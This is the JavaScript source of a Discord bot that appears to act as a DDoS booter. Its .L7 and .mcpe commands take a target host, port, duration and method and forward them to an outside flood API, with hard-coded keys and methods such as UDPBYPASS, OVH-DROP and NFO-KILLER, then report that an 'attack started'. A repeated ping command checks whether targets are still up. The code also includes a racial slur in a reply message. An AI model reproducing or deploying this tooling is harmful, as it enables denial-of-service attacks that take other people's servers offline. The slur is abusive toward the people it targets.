const discord = require("discord.js");
const ms = require("ms");
const ping = require("ping");
var axios = require("axios");
const libquery = require("libquery");
const config = require("./config.json");
const client = new discord.Client();
function Warn(msg) {
  var embed = new discord.RichEmbed().setTitle(msg).setColor("#CF9B10");
  return embed;
}
function isLetter(c) {
  return c.toLowerCase() != c.toUpperCase();
}
client.on("message", msg => {
  if (msg.content === ".cmd" && msg.channel.id === "channel id to execute help command") {
    const embed = new discord.RichEmbed()
      .setTitle("Help Menu")
      .setDescription(
        "\r\n\r\n" +
          config.prefix +
          "L4 \r\n" +
          config.prefix +
          "L7 \r\n" +
          ".L7"
      )
      .addField(
        "Some description.",
        "More description."
      )
      .setColor("#CF9B10")
      .setFooter("Developed by Drqgs");
    msg.channel.send(embed);
  }
});

client.on("message", msg => {
  if (
    msg.content === ".L4" &&
    msg.channel.id === "802680205436387358"
  ) {
    const embed = new discord.RichEmbed()
      .setTitle("Methods")
      .setColor("#00ffff")
      .setDescription("METHOD\nMETHOD\nMETHOD\nMETHOD\nMETHOD");
    msg.channel.send(embed);
    msg.delete();
  }
});

client.on("message", msg => {
  if (
    msg.content.startsWith(".L7") &&
    msg.channel.id === "802679719521812501"
  ) {
    const args = msg.content
      .slice(config.prefix.length)
      .trim()
      .split(/ +/g);
    if (args.length < 3) {
      msg.channel.send(Warn("usage: .http <host> <time>"));
      return;
    }
  //BLACKLISTING SYSTEM 
   if (args[1] === "IP") {
    msg.channel.send(Warn("TARGET IS BLACKLISTED!"));
    return;
  }
    if (isLetter(args[2])) {
      msg.channel.send(Warn("Port cannot contain characters!"));
      return;
    }
    if (isLetter(args[3])) {
      msg.channel.send(Warn("Time cannot contain characters!"));
      return;
    }
    if (Number(args[2]) > 65535) {
      msg.channel.send(Warn("Max port size is 65535!"));
      return;
    }
    if (Number(args[3]) > config.maxtime) {
      msg.channel.send(Warn("Max time is " + config.maxtime + " seconds!"));
      return;
    }
    if (msg.author.id === "id of user :trollface: (to blacklist from using the bot LOL)") {
      msg.channel.send(
        Warn("You thought you was gonna use this? Na dirty nigga.")
      );
      return;
    }

    switch (args[4]) {
    }
    axios
      .get(
        "" +
          args[1] +
          "&port=" +
          args[2] +
          "&time=" +
          args[3] +
          "&method=METHOD"
      )
      .then(response => {
        switch (response.data) {
          case "success":
            msg.channel.send(
              Warn(
                `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
              )
            );
            break;
          case "Running":
            msg.channel.send(
              Warn("Already have an attack running on " + args[1] + " !")
            );
            break;
          //attack started moved:
          default:
            msg.channel.send(
              Warn(
                "Attack started on " +
                  args[1] +
                  " for " +
                  args[3] +
                  " seconds with METHOD by" +
                  ` ${msg.author.username}`
              )
            );

            break;
        }
        msg.delete();
      });
  }
});

client.on("message", msg => {
  if (
    msg.content.startsWith(".mcpe") &&
    msg.channel.id === "802679742721294358"
  ) {
    const args = msg.content
      .slice(config.prefix.length)
      .trim()
      .split(/ +/g);
    if (args.length < 4) {
      msg.channel.send(Warn("usage: .mcpe <host> <port> <time> <method>"));
      return;
    }

    if (args[1] === "IP") {
     msg.channel.send(Warn("TARGET IS BLACKLISTED!"));
      return;
    }
    if (isLetter(args[2])) {
      msg.channel.send(Warn("Port cannot contain characters!"));
      return;
    }
    if (isLetter(args[3])) {
      msg.channel.send(Warn("Time cannot contain characters!"));
      return;
    }
    if (Number(args[2]) > 65535) {
      msg.channel.send(Warn("Max port size is 65535!"));
      return;
    }
    if (Number(args[3]) > config.maxtime) {
      msg.channel.send(Warn("Max time is " + config.maxtime + " seconds!"));
      return;
    }
    if (msg.author.id === "738520426229268520") {
      msg.channel.send(
        Warn("You thought you was gonna use this? Na dirty nigga.")
      );
      return;
    }
    if (args[4] === "MCPE") {
      axios
        .get(
          "https://api.supremesecurity.cz/sst/api?service=flood&key=62hzjy0ngoorfhy&host=" +
            args[1] +
            "&port=" +
            args[2] +
            "&time=" +
            args[3] +
            "&method=FIVEM-UDPBYPASS"
        )
        .then(response => {
          switch (response.data) {
            case "success":
              msg.channel.send(
                Warn(
                  `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
                )
              );
              break;
            default:
              msg.channel.send(
                Warn(
                  "Attack started on " +
                    args[1] +
                    " for " +
                    args[3] +
                    " seconds with " +
                    args[4] +
                    " by" +
                    ` ${msg.author.username}`
                )
              );
          }
        });
      return;
    }

    if (args[4] === "MCPEV2") {
      axios
        .get(
          "https://api.supremesecurity.cz/sst/api?service=flood&key=62hzjy0ngoorfhy&host=" +
            args[1] +
            "&port=" +
            args[2] +
            "&time=" +
            args[3] +
            "&method=UDPBYPASSV2"
        )
        .then(response => {
          switch (response.data) {
            case "success":
              msg.channel.send(
                Warn(
                  `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
                )
              );
              break;
            default:
              msg.channel.send(
                Warn(
                  "Attack started on " +
                    args[1] +
                    " for " +
                    args[3] +
                    " seconds with " +
                    args[4] +
                    " by" +
                    ` ${msg.author.username}`
                )
              );
          }
        });
      return;
    }

    if (args[4] === "MCPEV3") {
      axios
        .get(
          "https://api.supremesecurity.cz/sst/api?service=flood&key=62hzjy0ngoorfhy&host=" +
            args[1] +
            "&port=" +
            args[2] +
            "&time=" +
            args[3] +
            "&method=UDP-CONTROLV2"
        )
        .then(response => {
          switch (response.data) {
            case "success":
              msg.channel.send(
                Warn(
                  `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
                )
              );
              break;
            default:
              msg.channel.send(
                Warn(
                  "Attack started on " +
                    args[1] +
                    " for " +
                    args[3] +
                    " seconds with " +
                    args[4] +
                    " by" +
                    ` ${msg.author.username}`
                )
              );
          }
        });
      return;
    }
    if (args[4] === "OVH-KOSSAK") {
      axios
        .get(
          "https://api.supremesecurity.cz/sst/api?service=flood&key=62hzjy0ngoorfhy&host=" +
            args[1] +
            "&port=" +
            args[2] +
            "&time=" +
            args[3] +
            "&method=OVH-DROP"
        )
        .then(response => {
          switch (response.data) {
            case "success":
              msg.channel.send(
                Warn(
                  `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
                )
              );
              break;
            default:
              msg.channel.send(
                Warn(
                  "Attack started on " +
                    args[1] +
                    " for " +
                    args[3] +
                    " seconds with " +
                    args[4] +
                    " by" +
                    ` ${msg.author.username}`
                )
              );
          }
        });
      return;
    }
    if (args[4] === "NFO-KOSSAK") {
      axios
        .get(
          "https://api.supremesecurity.cz/sst/api?service=flood&key=62hzjy0ngoorfhy&host=" +
            args[1] +
            "&port=" +
            args[2] +
            "&time=" +
            args[3] +
            "&method=NFO-KILLER"
        )
        .then(response => {
          switch (response.data) {
            case "success":
              msg.channel.send(
                Warn(
                  `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
                )
              );
              break;
            default:
              msg.channel.send(
                Warn(
                  "Attack started on " +
                    args[1] +
                    " for " +
                    args[3] +
                    " seconds with " +
                    args[4] +
                    " by" +
                    ` ${msg.author.username}`
                )
              );
          }
        });
      return;
    }
    switch (args[4]) {
    }
    axios
      .get(
        "https://api.supremesecurity.cz/sst/api?service=flood&key=rxojotnd8364hc2&host=" +
          args[1] +
          "&port=" +
          args[2] +
          "&time=" +
          args[3] +
          "&method=" +
          args[4]
      )
      .then(response => {
        switch (response.data) {
          case "success":
            msg.channel.send(
              Warn(
                `Attack by ${msg.author.username} started on " + args[1] + " for " + args[3] + " seconds!`
              )
            );
            break;
          case "Running":
            msg.channel.send(
              Warn("Already have an attack running on " + args[1] + " !")
            );
            break;
          case "error":
            msg.channel.send(Warn(args[1] + " is blacklisted!"));
            break;
          //attack started moved:
          default:
            msg.channel.send(
              Warn(
                "Attack started on " +
                  args[1] +
                  " for " +
                  args[3] +
                  " seconds with " +
                  args[4] +
                  " by" +
                  ` ${msg.author.username}`
              )
            );

            break;
        }
        msg.delete();
      });
  }
});
client.on("message", msg => {
  if (
    msg.content.startsWith(".ping") &&
    msg.channel.id === "802707214325514290"
  ) {
    const args = msg.content
      .slice(config.prefix.length)
      .trim()
      .split(/ +/g);
    if (args[0].length < 4) {
      msg.channel.send(Warn("Usage: .ping <host>"));
      return;
    }
    if (args[1].length < 7) {
      msg.channel.send(Warn("Invalid host lenght!"));
      return;
    }
    if (args[1].length > 15) {
      msg.channel.send(Warn("Invalid host lenght!"));
      return;
    }
    msg.channel.send("Please wait while I Ping " + args[1]);
    var hosts = [args[1]];
    var i = 0;
    function myLoopspam() {
      setTimeout(function() {
        hosts.forEach(function(host) {
          ping.sys.probe(host, function(isAlive) {
            var whois = isAlive
              ? `Ping From ${msg.author.username} HOST ` +
                host +
                ` Is Online :white_check_mark:`
              : `Ping From ${msg.author.username} HOST ` +
                host +
                ` Is Offline:x:`;
            msg.channel.send(whois);
          });
        });
        i++;
        if (i < 10) {
          myLoopspam();
        }
      }, 2000);
    }
    myLoopspam();
  }
});

client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
  client.user.setPresence({
    status: "dnd",
    game: {
      name: "with the community",
      type: "PLAYING"
    }
  });
});
client.login(config.token);
